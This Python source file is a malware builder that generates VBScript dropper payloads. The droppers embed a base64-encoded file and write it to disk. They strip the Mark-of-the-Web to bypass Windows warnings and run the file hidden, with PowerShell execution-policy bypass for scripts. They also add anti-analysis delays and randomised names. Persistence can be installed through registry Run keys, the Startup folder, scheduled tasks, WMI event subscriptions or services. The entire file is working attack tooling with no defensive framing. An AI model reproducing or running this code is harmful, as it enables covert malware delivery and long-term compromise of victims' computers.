#!/usr/bin/env python3
"""
Core VBS payload generator — produces clean, working VBS scripts that:
1. Embed file content as base64 string
2. Decode with MSXML2.DOMDocument bin.base64
3. Write binary to disk with ADODB.Stream
4. Execute via WScript.Shell
5. Optionally add persistence (registry, startup folder, scheduled task, etc.)
6. Clean up after execution (unless persistence needs the file)

Matches the structure of known-working VBS payloads.
ALL modes go through this single generator to guarantee valid VBS output.
"""

import random
import string
import os


def _rand_name(length=10):
    return random.choice(string.ascii_lowercase) + ''.join(
        random.choices(string.ascii_lowercase + string.digits, k=length - 1)
    )


def _rand_filename(ext='.exe'):
    return _rand_name(8) + ext


def _build_run_expr(ext, v_cmd, v_filepath):
    """Build the VBS expression that sets the run command based on file extension."""
    if ext in ('.ps1',):
        return f'{v_cmd} = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File " & Chr(34) & {v_filepath} & Chr(34)'
    elif ext in ('.bat', '.cmd'):
        return f'{v_cmd} = "cmd /c " & Chr(34) & {v_filepath} & Chr(34)'
    else:
        return f'{v_cmd} = Chr(34) & {v_filepath} & Chr(34)'


def _build_persistence_block(method, v_shell, v_filepath, v_cmd, fn_delay):
    """Build VBS persistence code that uses existing script variables."""
    if method is None or method == 'none':
        return ''

    reg_key = _rand_name(8)
    task_name = _rand_name(8)

    lines = []
    lines.append('')
    lines.append(f'{fn_delay} 1000, 2000')

    if method == 'registry':
        lines.append(f'On Error Resume Next')
        lines.append(f'{v_shell}.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{reg_key}", {v_cmd}, "REG_SZ"')
        lines.append(f'Err.Clear')

    elif method in ('startup', 'startup_folder'):
        v_fso2 = _rand_name()
        v_startup = _rand_name()
        v_src = _rand_name()
        v_dst = _rand_name()
        lines.append(f'On Error Resume Next')
        lines.append(f'Set {v_fso2} = CreateObject("Scripting.FileSystemObject")')
        lines.append(f'{v_startup} = {v_shell}.SpecialFolders("Startup")')
        lines.append(f'{v_src} = WScript.ScriptFullName')
        lines.append(f'{v_dst} = {v_startup} & "\\{_rand_name(6)}.vbs"')
        lines.append(f'If {v_fso2}.FileExists({v_src}) Then')
        lines.append(f'    {v_fso2}.CopyFile {v_src}, {v_dst}, True')
        lines.append(f'End If')
        lines.append(f'Set {v_fso2} = Nothing')
        lines.append(f'Err.Clear')

    elif method in ('task', 'scheduled_task'):
        v_tcmd = _rand_name()
        lines.append(f'On Error Resume Next')
        lines.append(f'{v_tcmd} = "schtasks /create /tn " & Chr(34) & "{task_name}" & Chr(34) & " /tr " & Chr(34) & {v_cmd} & Chr(34) & " /sc onlogon /f"')
        lines.append(f'{v_shell}.Run "cmd /c " & {v_tcmd}, 0, True')
        lines.append(f'Err.Clear')

    elif method == 'wmi':
        lines.append(f'On Error Resume Next')
        lines.append(f'Dim objWMI, objFilter, objConsumer, objBinding')
        lines.append(f'Set objWMI = GetObject("winmgmts:\\\\.\\root\\subscription")')
        v_fn = _rand_name(8)
        v_cn = _rand_name(8)
        lines.append(f'Set objFilter = objWMI.Get("__EventFilter").SpawnInstance_')
        lines.append(f'objFilter.Name = "{v_fn}"')
        lines.append(f'objFilter.EventNamespace = "root\\cimv2"')
        lines.append(f'objFilter.QueryLanguage = "WQL"')
        lines.append(f'objFilter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"')
        lines.append(f'objWMI.Put_ objFilter')
        lines.append(f'Set objConsumer = objWMI.Get("CommandLineEventConsumer").SpawnInstance_')
        lines.append(f'objConsumer.Name = "{v_cn}"')
        lines.append(f'objConsumer.CommandLineTemplate = {v_cmd}')
        lines.append(f'objWMI.Put_ objConsumer')
        lines.append(f'Set objBinding = objWMI.Get("__FilterToConsumerBinding").SpawnInstance_')
        lines.append(f'objBinding.Filter = objFilter.Path_.Path')
        lines.append(f'objBinding.Consumer = objConsumer.Path_.Path')
        lines.append(f'objWMI.Put_ objBinding')
        lines.append(f'Err.Clear')

    elif method == 'service':
        v_svcname = _rand_name(8)
        lines.append(f'On Error Resume Next')
        lines.append(f'{v_shell}.Run "cmd /c sc create {v_svcname} binPath= " & Chr(34) & "cmd /c " & {v_cmd} & Chr(34) & " start= auto", 0, True')
        lines.append(f'{v_shell}.Run "cmd /c net start {v_svcname}", 0, False')
        lines.append(f'Err.Clear')

    elif method == 'multi':
        lines.append(f'On Error Resume Next')
        lines.append(f'{v_shell}.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{reg_key}", {v_cmd}, "REG_SZ"')
        lines.append(f'Err.Clear')
        lines.append(f'')
        lines.append(f'On Error Resume Next')
        v_fso3 = _rand_name()
        v_startup2 = _rand_name()
        v_src2 = _rand_name()
        v_dst2 = _rand_name()
        lines.append(f'Set {v_fso3} = CreateObject("Scripting.FileSystemObject")')
        lines.append(f'{v_startup2} = {v_shell}.SpecialFolders("Startup")')
        lines.append(f'{v_src2} = WScript.ScriptFullName')
        lines.append(f'{v_dst2} = {v_startup2} & "\\{_rand_name(6)}.vbs"')
        lines.append(f'If {v_fso3}.FileExists({v_src2}) Then')
        lines.append(f'    {v_fso3}.CopyFile {v_src2}, {v_dst2}, True')
        lines.append(f'End If')
        lines.append(f'Set {v_fso3} = Nothing')
        lines.append(f'Err.Clear')
        lines.append(f'')
        lines.append(f'On Error Resume Next')
        v_tcmd2 = _rand_name()
        lines.append(f'{v_tcmd2} = "schtasks /create /tn " & Chr(34) & "{task_name}" & Chr(34) & " /tr " & Chr(34) & {v_cmd} & Chr(34) & " /sc onlogon /f"')
        lines.append(f'{v_shell}.Run "cmd /c " & {v_tcmd2}, 0, True')
        lines.append(f'Err.Clear')

    return '\n'.join(lines)


def generate_self_extracting_vbs(
    base64_data: str,
    original_filename: str,
    write_dir: str = 'MyDocuments',
    cleanup: bool = True,
    delays: bool = True,
    delay_min: int = 2000,
    delay_max: int = 5000,
    persistence: str = None,
) -> str:
    """Generate a complete self-extracting VBS payload.

    Args:
        base64_data: Base64-encoded file content
        original_filename: Original filename (used to determine extension)
        write_dir: VBS SpecialFolders name or 'temp' for %TEMP%
        cleanup: Whether to delete the extracted file after execution
        delays: Whether to add anti-analysis random delays
        delay_min: Minimum delay in milliseconds
        delay_max: Maximum delay in milliseconds
        persistence: Persistence method or None/'none' for no persistence

    Returns:
        Complete VBS script as a string
    """
    ext = os.path.splitext(original_filename)[1].lower()
    drop_name = _rand_filename(ext)

    v_shell = _rand_name()
    v_fso = _rand_name()
    v_b64 = _rand_name()
    v_decoded = _rand_name()
    v_filepath = _rand_name()
    v_cmd = _rand_name()
    fn_decode = 'DecodeBase64' + _rand_name(6)
    fn_write = 'WriteBinary' + _rand_name(6)
    fn_delay = 'RndDelay' + _rand_name(4)

    if write_dir == 'temp':
        path_expr = f'{v_shell}.ExpandEnvironmentStrings("%temp%") & "\\{drop_name}"'
    else:
        path_expr = f'{v_shell}.SpecialFolders("{write_dir}") & "\\{drop_name}"'

    run_expr = _build_run_expr(ext, v_cmd, v_filepath)

    has_persistence = persistence is not None and persistence != 'none'
    if has_persistence:
        cleanup = False

    delay_call = ''
    if delays:
        delay_call = f'{fn_delay} {delay_min}, {delay_max}'

    cleanup_block = ''
    if cleanup:
        cleanup_lines = []
        if delays:
            cleanup_lines.append(delay_call)
            cleanup_lines.append(delay_call)
        cleanup_lines.append(f'Set {v_fso} = CreateObject("Scripting.FileSystemObject")')
        cleanup_lines.append(f'If {v_fso}.FileExists({v_filepath}) Then')
        cleanup_lines.append(f'    {v_fso}.DeleteFile {v_filepath}')
        cleanup_lines.append(f'End If')
        cleanup_lines.append(f'Set {v_fso} = Nothing')
        cleanup_block = '\n'.join(cleanup_lines)

    persistence_block = _build_persistence_block(persistence, v_shell, v_filepath, v_cmd, fn_delay)

    v_fso_motw = _rand_name()
    fn_strip_motw = 'StripMOTW' + _rand_name(6)

    main_lines = []
    main_lines.append(f'On Error Resume Next')
    main_lines.append(f'{fn_strip_motw} WScript.ScriptFullName')
    main_lines.append(f'Err.Clear')
    main_lines.append(f'On Error GoTo 0')
    main_lines.append(f'')
    main_lines.append(f'Set {v_shell} = CreateObject("WScript.Shell")')
    main_lines.append(f'')

    chunk_size = 4000
    if len(base64_data) <= chunk_size:
        main_lines.append(f'{v_b64} = "{base64_data}"')
    else:
        main_lines.append(f'{v_b64} = ""')
        for i in range(0, len(base64_data), chunk_size):
            chunk = base64_data[i:i + chunk_size]
            main_lines.append(f'{v_b64} = {v_b64} & "{chunk}"')

    main_lines.append(f'{v_decoded} = {fn_decode}({v_b64})')
    main_lines.append(f'')
    main_lines.append(f'{v_filepath} = {path_expr}')
    main_lines.append(f'{fn_write} {v_filepath}, {v_decoded}')
    main_lines.append(f'{fn_strip_motw} {v_filepath}')
    main_lines.append(f'')
    if delays:
        main_lines.append(delay_call)
    main_lines.append(f'{run_expr}')
    main_lines.append(f'{v_shell}.Run {v_cmd}, 0, False')

    if persistence_block:
        main_lines.append(persistence_block)

    if delays:
        main_lines.append(f'')
        main_lines.append(delay_call)

    if cleanup_block:
        main_lines.append(f'')
        main_lines.append(cleanup_block)

    main_lines.append(f'')
    main_lines.append(f'Set {v_shell} = Nothing')

    func_lines = []
    func_lines.append(f'')
    func_lines.append(f'Function {fn_decode}(base64Str)')
    func_lines.append(f'    Dim objXML, objNode')
    func_lines.append(f'    Set objXML = CreateObject("MSXML2.DOMDocument")')
    func_lines.append(f'    Set objNode = objXML.CreateElement("b64")')
    func_lines.append(f'    objNode.DataType = "bin.base64"')
    func_lines.append(f'    objNode.Text = base64Str')
    func_lines.append(f'    {fn_decode} = objNode.nodeTypedValue')
    func_lines.append(f'End Function')

    func_lines.append(f'')
    func_lines.append(f'Sub {fn_write}(filePath, binaryData)')
    func_lines.append(f'    Dim objStream')
    func_lines.append(f'    Set objStream = CreateObject("ADODB.Stream")')
    func_lines.append(f'    objStream.Type = 1')
    func_lines.append(f'    objStream.Open')
    func_lines.append(f'    objStream.Write binaryData')
    func_lines.append(f'    objStream.SaveToFile filePath, 2')
    func_lines.append(f'    objStream.Close')
    func_lines.append(f'    Set objStream = Nothing')
    func_lines.append(f'End Sub')

    func_lines.append(f'')
    func_lines.append(f'Sub {fn_delay}(mn, mx)')
    func_lines.append(f'    Randomize')
    func_lines.append(f'    Dim dt')
    func_lines.append(f'    dt = Int((mx - mn + 1) * Rnd + mn)')
    func_lines.append(f'    WScript.Sleep dt')
    func_lines.append(f'End Sub')

    func_lines.append(f'')
    func_lines.append(f'Sub {fn_strip_motw}(targetPath)')
    func_lines.append(f'    On Error Resume Next')
    func_lines.append(f'    Dim {v_fso_motw}')
    func_lines.append(f'    Set {v_fso_motw} = CreateObject("Scripting.FileSystemObject")')
    func_lines.append(f'    {v_fso_motw}.DeleteFile targetPath & ":Zone.Identifier"')
    func_lines.append(f'    Err.Clear')
    func_lines.append(f'    Set {v_fso_motw} = Nothing')
    func_lines.append(f'End Sub')

    return '\n'.join(main_lines + func_lines)


def generate_persistent_vbs(
    base64_data: str,
    original_filename: str,
    persistence: str = 'multi',
) -> str:
    """Generate self-extracting VBS with built-in persistence.

    Writes to MyDocuments (permanent location), executes, sets up persistence,
    does NOT clean up since persistence needs the file on disk.

    Returns:
        Complete VBS script as a string
    """
    return generate_self_extracting_vbs(
        base64_data=base64_data,
        original_filename=original_filename,
        write_dir='MyDocuments',
        cleanup=False,
        delays=True,
        persistence=persistence,
    )


def generate_combined_vbs(
    base64_data: str,
    original_filename: str,
    persistence: str = 'none',
) -> str:
    """Generate VBS for the combined pipeline.

    If persistence is 'none', produces a standard self-extracting payload.
    Otherwise produces a persistent one with the chosen method built in.

    Returns:
        Complete VBS script as a string
    """
    has_persistence = persistence is not None and persistence != 'none'
    return generate_self_extracting_vbs(
        base64_data=base64_data,
        original_filename=original_filename,
        write_dir='MyDocuments' if has_persistence else 'temp',
        cleanup=not has_persistence,
        delays=True,
        persistence=persistence,
    )
